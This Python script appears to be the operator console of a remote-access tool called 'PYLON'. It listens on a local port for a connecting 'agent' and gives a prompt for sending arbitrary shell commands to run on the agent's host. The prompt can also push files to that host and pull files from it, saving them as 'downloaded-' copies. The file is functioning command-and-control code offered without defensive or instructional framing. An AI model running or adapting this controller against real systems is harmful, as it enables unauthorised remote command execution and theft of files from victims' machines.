import socket
import struct 
import os 

HOST = '127.0.0.1'
PORT = 9001

def receive_exact(conn, size):
    buffer = b""
    while len(buffer) < size:
        chunk = conn.recv(size - len(buffer))
        if not chunk:
            return None
        buffer += chunk
    return buffer

def handle_agent(conn, addr):
    print(f"Connection: {addr}")
    print("Exit - close program")
    print("drop - disconnect agent, allow he to reconnect")
    print("upload <path>, download <path>")
    print("==== PYLON ====")
    
    try:
        while True:
            cmd = input("pylon >")
            
            if not cmd:
                continue
            
            if cmd in ['exit', 'quit']:
                header = struct.pack("!II", 4, 0)
                conn.sendall(header)
                print("Closing session")
                break
                
            if cmd == 'drop':
                print('Disconnecting agent')
                break
            
            if cmd.startswith("upload "):
                try:
                    local_path = cmd.split(" ", 1)[1]
                    if not os.path.exists(local_path):
                        print("ERROR: File not found")
                        continue
                    
                    filename = os.path.basename(local_path)
                    filename_bytes = filename.encode('utf-8')
                    
                    with open(local_path, "rb") as f:
                        file_bytes = f.read()
                    
                    payload = struct.pack("!I", len(filename_bytes)) + filename_bytes + file_bytes
                    header = struct.pack("!II", 2, len(payload))
                    
                    conn.sendall(header + payload)
                    print(f"Sending '{filename}'")
                    
                    resp_h = receive_exact(conn, 8)
                    r_id, r_len = struct.unpack("!II", resp_h)
                    msg = receive_exact(conn, r_len).decode()
                    print(f"Output: {msg}")
                except Exception as e:
                    print(f"Error: {e}")
                continue    
            
            if cmd.startswith("download "):
                try:
                    remote_path = cmd.split(" ", 1)[1]
                    payload = remote_path.encode()
                    header = struct.pack("!II", 3, len(payload))
                    
                    conn.sendall(header + payload)
                    
                    resp_h = receive_exact(conn ,8)
                    if not resp_h:
                        print("No response")
                        break
                    
                    r_id, r_len = struct.unpack("!II", resp_h)
                    
                    if r_id == 5:
                        err_msg =  receive_exact(conn, r_len).decode()
                        print(f"Agent error {err_msg}")
                    elif r_id == 3:
                        file_bytes = receive_exact(conn, r_len)
                        out_name = f"downloaded-{os.path.basename(remote_path)}"
                        with open(out_name, "wb") as f:
                            f.write(file_bytes)
                        print(f"Saved as {out_name}")
                except Exception as e:
                    print(f'Error: {e}')
                continue
                           
            payload = cmd.encode()
            header = struct.pack("!II", 1, len(payload)) # 1 - shell execution
            conn.sendall(header + payload)
            print(f'Sent {cmd}')
                    
            resp_header_raw = receive_exact(conn, 8)
            if not resp_header_raw:
                print("Agent disconnected")
                return
            
            resp_id, resp_len = struct.unpack("!II", resp_header_raw)
            print(f"Response header: ID={resp_id}, len={resp_len} bytes")
            
            if resp_len > 0:
                result_raw = receive_exact(conn, resp_len)
                print(f"Response:\n" + "-"*30)
                print(result_raw.decode(errors='ignore').strip())
                print("-" * 30)
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        conn.close()


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"Listening for {HOST}:{PORT}")
    
    try:
        while True:
            conn, addr = server.accept()
            handle_agent(conn, addr)
    except KeyboardInterrupt:
        print('Closing')
    finally:
        server.close()    
    
if __name__ == "__main__":
    main()